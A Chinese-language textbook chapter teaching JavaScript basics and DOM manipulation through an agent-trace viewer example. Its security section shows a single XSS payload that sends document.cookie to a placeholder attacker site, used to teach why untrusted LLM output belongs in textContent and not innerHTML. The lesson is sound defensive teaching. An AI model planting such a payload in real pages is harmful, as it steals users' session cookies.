# 第 32 章 JavaScript 从零开始

> 上一章的页面是"死"的——它只能看，不能互动。JavaScript（简称 JS）就是让网页活起来的那门语言：你点一下按钮有反应、输入框打字有变化、数据来了自动刷新，全靠它。本章假设你**完全没写过 JS**（哪怕你写过别的语言，也当你没写过，从头讲）。目标是：读完你能用纯 JS 给上一章的页面加上搜索、过滤、点击展开这些真功能。

## 32.1 三个写 JS 的地方，先用前两个

JS 可以在三个地方运行，初学先用前两个：

```html
<!-- ① 浏览器的 Console（按 F12 → Console 标签）：一个能立刻运行代码的小窗口，学语法最快 -->

<!-- ② 网页里的 <script> 标签：页面的"行为代码"写这里 -->
<body>
  <h1 id="title">你好</h1>
  <script>
    // 这段代码会在页面加载时运行
    document.getElementById("title").textContent = "你好，JavaScript！";
  </script>
</body>
```

第③个地方是 Node.js（让 JS 脱离浏览器、在命令行里跑），第 34 章配工程时再用。

**现在就动手**：打开任意网页，按 F12，切到 Console 标签，在那个 `>` 提示符后面输入下面几行，每行回车看结果：

```javascript
1 + 1                  // 回车，显示 2
"agent".toUpperCase()  // 显示 "AGENT"（把字母变大写）
alert("你好")           // 弹出一个对话框
```

Console 是你学 JS 最快的"反馈回路"——想试什么语法，直接敲进去看结果，不用建文件。本章建议你**边读边在 Console 里试**。

## 32.2 变量：给数据起名字

写程序就是在摆弄数据，而变量就是"给一块数据起个名字，方便反复用"。JS 里声明变量只用两个词：

```javascript
const name = "mini-claude-code";   // const：起个名，之后不再改它（默认都先用这个）
let count = 0;                      // let：这个名字代表的值之后会变，才用 let
count = count + 1;                 // ✓ count 现在是 1（用 let 声明的可以重新赋值）
// name = "别的";                  // ✗ 报错！const 声明的不许改
```

**新手准则**：默认全用 `const`，只有当你确定这个值之后要变（比如计数器）才用 `let`。还有一个老古董叫 `var`，**永远别用它**，见到了知道是过时写法即可。

数据有几种基本"类型"，先掌握这几种：

```javascript
const s = "一段文字";   // 字符串（string），用引号包起来
const n = 42;          // 数字（number），注意：整数和小数在 JS 里是同一种类型
const ok = true;       // 布尔（boolean），只有 true / false 两个值
const nothing = null;  // null：表示"故意留空"
let notYet;            // 没赋值的变量，自动是 undefined（"还没有值"）
```

字符串拼接最常用"模板字符串"——用**反引号**（键盘 1 左边那个键）包起来，里面用 `${}` 塞变量：

```javascript
const tool = "bash";
const ms = 320;
console.log(`工具 ${tool} 耗时 ${ms}ms`);   // 输出：工具 bash 耗时 320ms
```

`console.log(...)` 是"打印到 Console"的意思，是你调试时最好的朋友——想知道某个变量是啥，就 `console.log` 它。

### 32.2.1 一个会坑你的细节：用三个等号比较

JS 里比较两个值相不相等，**永远用三个等号 `===`**，别用两个等号 `==`：

```javascript
1 === 1      // true（类型和值都一样）
1 === "1"    // false（一个是数字一个是字符串，不相等，符合直觉）

1 == "1"     // true ！两个等号会偷偷把类型转一下再比，这是无数 bug 的源头
```

记住一条规则就行：**比较一律用 `===`**。这能帮你避开 JS 最经典的坑。

另外，`if` 判断里有些值会被当成"假"：`false`、`0`、`""`（空字符串）、`null`、`undefined`、`NaN`，其余都算"真"。所以可以这样简写：

```javascript
if (toolName) {   // 当 toolName 是非空字符串时，这里成立
  // ...
}
```

## 32.3 控制流：让代码做判断和重复

程序要会"如果……就……"和"重复做某事"。

```javascript
const status = "failed";

// if / else：分情况处理
if (status === "passed") {
  console.log("✓ 通过");
} else if (status === "failed") {
  console.log("✗ 失败");
} else {
  console.log("? 未知");
}

// 三元表达式：if-else 的简写，适合"二选一"
const icon = status === "passed" ? "✓" : "✗";   // 条件 ? 真时的值 : 假时的值
```

重复做某事用循环。最常用的是 `for...of`（遍历一组东西）：

```javascript
const events = ["grep", "bash", "edit"];
for (const event of events) {     // 把 events 里的每一项依次取出来叫 event
  console.log(event);             // 依次打印 grep、bash、edit
}

// 传统计数循环（从 0 数到 4）
for (let i = 0; i < 5; i++) {
  console.log(i);
}
```

## 32.4 函数：把一段操作打包复用

函数就是"把一段代码打包，起个名字，以后想用就喊一声"。比如做加法这件事，不想每次都重写：

```javascript
// 写法一：函数声明
function add(a, b) {       // a、b 是"参数"，是函数的输入
  return a + b;            // return：把结果交回去
}
add(2, 3);                 // 调用它，得到 5

// 写法二：箭头函数（现代代码最常用，更简短）
const add2 = (a, b) => a + b;        // 单行可以省略 return 和大括号
const square = (x) => x * x;         // 一个参数
const greet = () => {                // 没有参数；多行要写大括号和 return
  return "你好";
};
```

两种写法你都会见到，箭头函数更常见。函数还能有"默认参数"：

```javascript
const fetchRuns = (limit = 20) => {
  // 如果调用时不传 limit，它默认就是 20
};
fetchRuns();      // limit 是 20
fetchRuns(50);    // limit 是 50
```

**JS 函数有个特别之处**：函数本身也是一种"值"，可以存进变量、当参数传给别人、当结果返回。这一点是 JS 的灵魂，叫"回调"——你把一个函数交给别人，约定好"到时候你帮我调它"。前端到处是回调：

```javascript
// "数组的每一项，请用我给你的这个函数处理一遍"
[1, 2, 3].map((x) => x * 2);                          // 得到 [2, 4, 6]

// "这个按钮被点击时，请调用我给你的这个函数"
button.addEventListener("click", () => console.log("被点了！"));

// "1 秒之后，请调用我给你的这个函数"
setTimeout(() => console.log("1 秒到"), 1000);
```

现在看不太懂回调没关系，下面 DOM 那节会反复用到，用着用着就懂了。

## 32.5 对象和数组：组织数据的两种容器

单个变量只能装一个值，真实数据需要"成组"地装。JS 有两个容器：对象和数组。

### 32.5.1 对象：带标签的一组数据

对象用来描述"一个东西的多个属性"。比如描述一次工具调用：

```javascript
const event = {
  type: "tool_call",              // 每一项是 "键: 值"
  toolName: "bash",
  durationMs: 320,
  args: { command: "cargo test" }, // 值可以又是一个对象（套娃）
};

// 读取里面的值，两种写法：
event.toolName            // "bash"（点号，最常用）
event["toolName"]         // "bash"（方括号，当键名是变量时用）

// 修改和新增（对象是"活"的，随时能改）
event.durationMs = 999;   // 改一个
event.isError = false;    // 加一个新的
```

有几个每天都会用到的对象语法，先混个脸熟：

```javascript
// 解构：从对象里"拆"出几个值，存成单独的变量
const { toolName, durationMs } = event;   // 等于 toolName = event.toolName ...

// 展开（三个点）：复制一个对象，顺便改几个字段（不破坏原对象）
const updated = { ...event, durationMs: 0 };   // 复制 event，但把 durationMs 改成 0

// 可选链 ?. ：安全地访问可能不存在的嵌套属性，不报错
event.result?.output      // 如果 result 不存在，整个表达式是 undefined，而不是崩溃
```

### 32.5.2 数组：有顺序的一列数据

数组用来装"一串同类的东西"，比如一串事件：

```javascript
const events = [];          // 空数组
events.push(event);         // 往末尾加一个
events.length               // 数组里有几个
events[0]                   // 第一个（从 0 开始数）
events.at(-1)               // 最后一个

const [first, second] = events;   // 数组也能解构
```

**数组三剑客：map / filter / reduce**。前端代码里一半的逻辑都靠这三个，必须练熟。先准备一组示例数据：

```javascript
const events = [
  { type: "tool_call",   toolName: "bash", durationMs: 320 },
  { type: "tool_call",   toolName: "read", durationMs: 12 },
  { type: "tool_result", toolName: "bash", durationMs: 0 },
  { type: "tool_call",   toolName: "bash", durationMs: 95 },
];
```

**map：逐个"变形"，得到一个等长的新数组**。

```javascript
const names = events.map((e) => e.toolName);
// 把每个事件 e 变成它的 toolName，得到 ["bash", "read", "bash", "bash"]
```

**filter：按条件"筛选"，得到一个子集**。

```javascript
const calls = events.filter((e) => e.type === "tool_call");
// 只留下 type 是 tool_call 的，得到 3 个
```

**reduce：把整个数组"折叠"成一个值**（比如求总和）。

```javascript
const totalMs = events.reduce((sum, e) => sum + e.durationMs, 0);
// sum 是累计值，从 0 开始，每次加上当前 e.durationMs，最后得到 427
```

它们还能**串起来用**，像流水线一样：

```javascript
const bashTotal = events
  .filter((e) => e.toolName === "bash")   // 先筛出 bash 的
  .map((e) => e.durationMs)               // 取出每个的耗时
  .reduce((a, b) => a + b, 0);            // 加起来
```

其他几个高频方法，看一眼有印象：

```javascript
events.find((e) => e.durationMs > 100)    // 找出第一个满足条件的（找不到给 undefined）
events.some((e) => e.durationMs > 100)    // 有没有任何一个满足？→ true/false
events.every((e) => e.durationMs < 1000)  // 是不是全都满足？→ true/false
```

> **给所有人的提醒（尤其写过 Rust 的）**：对象和数组赋值给另一个变量时，是"共享同一份"，不是复制。`const b = a; b.x = 2;` 会让 `a.x` 也变成 2，因为 b 和 a 指向同一个对象。想要真正的副本，用展开 `{ ...a }`（浅拷贝）或 `structuredClone(a)`（深拷贝）。这是 JS 新手最容易栽的坑之一，记住它。

### 32.5.3 JSON：前后端之间的"普通话"

前端和后端（你 Part 2 写的 Rust 服务）传数据，用的是一种叫 JSON 的文本格式（长得就像 JS 对象）。两个函数搞定转换：

```javascript
const text = JSON.stringify(event);              // 对象 → 文本（要发给服务器时）
const obj = JSON.parse('{"type":"tool_call"}');  // 文本 → 对象（收到服务器响应时）
JSON.stringify(event, null, 2)                   // 加上 null, 2 会美化缩进，方便调试时看
```

## 32.6 DOM 操作：用 JS 接管页面

终于到重点了。前面铺垫的语法，都是为了这一步——**用 JS 修改页面**。回忆第 31 章说的：浏览器把 HTML 变成一棵 DOM 树，而 JS 能读写这棵树，改了树页面就变。

核心 API 分五类，每类配一个例子。建议你打开第 31 章做的轨迹页面，在 Console 里挨个试：

```javascript
// ① 找到元素（用第 31 章的 CSS 选择器语法）
const title = document.querySelector("h1");            // 找第一个匹配的
const rows = document.querySelectorAll(".event-row");  // 找全部匹配的

// ② 读写内容
title.textContent = "Run #43";        // 改纯文字（安全，首选）
input.value                           // 读输入框里用户打的字

// ③ 读写样式和 class
row.classList.add("failed");          // 加一个 class
row.classList.remove("failed");       // 去掉
row.classList.toggle("collapsed");    // 有就去掉、没有就加上（做"折叠"一行搞定）

// ④ 创建和插入新元素
const div = document.createElement("div");   // 凭空造一个 <div>
div.textContent = "bash · 320ms";
div.className = "event-row";
timeline.append(div);                         // 把它塞到 timeline 末尾
row.remove();                                 // 删掉某个元素

// ⑤ 监听事件：所有交互的基础
button.addEventListener("click", (e) => {     // "当 button 被点击时，运行这个函数"
  console.log("被点了", e.target);            // e 是事件信息，e.target 是被点的元素
});
input.addEventListener("input", (e) => {      // 用户每打一个字就触发
  console.log("当前输入：", e.target.value);
});
```

第⑤类的"监听事件"就是前面说的回调：你把一个函数交给浏览器，说"等这件事发生了你帮我调它"。这是网页能"互动"的全部秘密。

## 32.7 综合实战：给轨迹页面加上真功能

现在把上一章静态的轨迹页面"通电"。我们要实现：输入框搜索、复选框过滤失败项、点击某行在右栏看详情。

先理解这个程序的核心思路——**状态 → 重新渲染**：我们把数据和过滤条件存成"状态"，每当状态变化，就清空页面、根据最新状态重画一遍。听起来浪费，但代码简单到不容易出错。

```javascript
// app.js（在 HTML 里用 <script src="app.js" defer></script> 引入，defer 表示等页面就绪再跑）

// 1. 数据（实际项目里这些会从后端拿，这里先写死）
const events = [
  { id: 1, tool: "grep", summary: "divide( → src/math.rs:12", ms: 8,    ok: true },
  { id: 2, tool: "bash", summary: "cargo test → 1 个失败",    ms: 2100, ok: false },
  { id: 3, tool: "edit", summary: "src/math.rs +4 -1",        ms: 15,   ok: true },
  { id: 4, tool: "bash", summary: "cargo test → 全部通过",     ms: 1900, ok: true },
];

// 2. 抓住页面上的几个元素
const timeline = document.querySelector(".timeline");
const search = document.querySelector("#search");          // 一个 <input id="search">
const onlyFailed = document.querySelector("#only-failed"); // 一个 <input type="checkbox">

// 3. 渲染函数：根据当前状态画出页面
function render() {
  const keyword = search.value.toLowerCase();   // 搜索框里的字（转小写方便匹配）
  const failedOnly = onlyFailed.checked;        // 复选框勾没勾

  const visible = events
    .filter((e) => !failedOnly || !e.ok)                     // 勾了就只留失败的
    .filter((e) => e.tool.includes(keyword)                  // 工具名或摘要里包含关键词
                || e.summary.toLowerCase().includes(keyword));

  timeline.innerHTML = "";                       // 清空（朴素但够用）
  for (const e of visible) {
    const row = document.createElement("div");
    row.className = e.ok ? "event-row" : "event-row failed";
    row.dataset.id = e.id;                       // 把业务 id 存在 data-id 属性里，待会用
    row.innerHTML = `
      <span class="tool-name">${e.tool}</span>
      <span class="summary"></span>
      <span class="duration">${e.ms}ms</span>`;
    // 用户数据用 textContent 填，不要拼进 innerHTML（原因见 32.8）
    row.querySelector(".summary").textContent = e.summary;
    timeline.append(row);
  }
}

// 4. 绑定事件：输入或勾选时，重新渲染
search.addEventListener("input", render);
onlyFailed.addEventListener("change", render);

// 5. 点击某一行 → 右栏显示详情（用"事件委托"，下面解释）
timeline.addEventListener("click", (e) => {
  const row = e.target.closest(".event-row");    // 从点击处往上找最近的事件行
  if (!row) return;                              // 没点在行上就算了
  const ev = events.find((x) => x.id === Number(row.dataset.id));
  document.querySelector(".inspector pre").textContent = JSON.stringify(ev, null, 2);
});

render();   // 首次渲染
```

第 5 步用了一个技巧叫**事件委托**：我们没有给每一行单独绑点击事件，而是给它们的父容器 `timeline` 绑一个，靠"点击会从子元素冒泡到父元素"的机制，统一在父容器里处理。当行是动态生成、数量不定时，这是标准做法（第 38 章的长列表会再用到）。

注意 `render()` 的模式：**状态（数据 + 过滤条件）变了，就整个重画**。每次全量重画听着浪费，但好处是代码极简、不容易出 bug。"怎么只更新变化的部分、更高效地重画"正是第 35 章 React 要解决的问题——你现在已经摸到 React 的门把手了。

## 32.8 安全第一课：永远别把不可信内容塞进 innerHTML

注意上面代码里有个刻意的细节：`summary` 我用 `textContent` 填，而不是拼进 `innerHTML`。这关乎安全，必须讲清楚。

```javascript
// 假设某个工具的输出里藏了这样一段（模型能生成任意文本！）
const evil = `<img src=x onerror="fetch('https://坏人网站/偷?c='+document.cookie)">`;

panel.innerHTML = evil;   // 💥 灾难！这段会被当成 HTML 执行，你的 cookie 被偷走
panel.textContent = evil; // ✓ 安全：只是把这串字符原样显示出来，不执行
```

这种攻击叫 **XSS（跨站脚本）**。规则非常简单，背下来：

> **任何不是你自己硬编码的内容（用户输入、后端响应、尤其是 LLM 的输出），一律用 `textContent` 显示，永远不要塞进 `innerHTML`。**

Agent 前端对这点格外敏感——因为你在屏幕上渲染的，正是大模型生成的、不可信的文本（这是第 19 章 prompt injection 在前端的战场）。

## 32.9 小结与练习

- 用 `const` 起名、`let` 备用、`===` 比较、反引号模板字符串拼字符串。
- 对象装"带标签的一组数据"，数组装"有顺序的一列"；解构、展开、`?.` 是每日语法；注意它们是"共享引用"不是复制。
- map（变形）、filter（筛选）、reduce（折叠）是处理数据的三剑客，能串起来用。
- DOM 五类操作：找元素、读写内容、改 class/样式、增删元素、监听事件；交互的本质是"给事件绑回调"。
- "状态变 → 全量重画"是通往 React 的思维桥梁；不可信内容永远用 `textContent`。

**练习**

1. 完成 32.7 的全部功能，再加两个：点击"工具"表头按耗时排序（点一下升序、再点降序）；一个"全部展开/收起"的按钮。
2. 写一个函数 `groupBy(events, "tool")`，把事件按工具名分组，返回 `{ bash: [...], grep: [...] }`，用 `reduce` 实现。
3. 做一个暗色/亮色主题切换按钮：点击时用 `classList.toggle` 给 `<body>` 加减 `light` 这个 class（配合第 31 章练习 3 的亮色变量）。
4. 故意把某个事件的 `summary` 换成 32.8 里的 `evil` 字符串，确认你的页面只是把它显示出来、不会执行它。

> **下一章**：JavaScript 进阶——闭包、异步、事件循环。听起来吓人，但都是你写真实应用绕不开的，我们照样从生活类比讲起。
